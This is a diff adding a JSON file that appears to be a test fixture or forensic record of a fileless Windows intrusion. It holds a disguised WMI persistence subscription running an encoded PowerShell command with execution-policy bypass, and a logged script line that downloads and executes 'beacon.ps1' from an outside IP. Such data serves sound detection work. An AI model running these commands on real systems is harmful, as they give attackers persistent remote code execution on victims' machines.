@@ -1,0 +1,21 @@
+{
+  "wmi_subscriptions": [
+    {
+      "name": "SystemUpdate",
+      "event_filter": "__InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
+      "consumer": "CommandLineEventConsumer",
+      "command": "powershell.exe -ep bypass -e JABjAGwAaQBlAG4..."
+    }
+  ],
+  "script_block_events": [
+    {
+      "event_id": 4104,
+      "time": "2024-01-14T03:20:00Z",
+      "script_text": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.42/beacon.ps1')",
+      "path": ""
+    }
+  ],
+  "diskless_processes": [
+    {"pid": 6712, "name": "powershell.exe", "path": "", "memory_only": true}
+  ]
+}
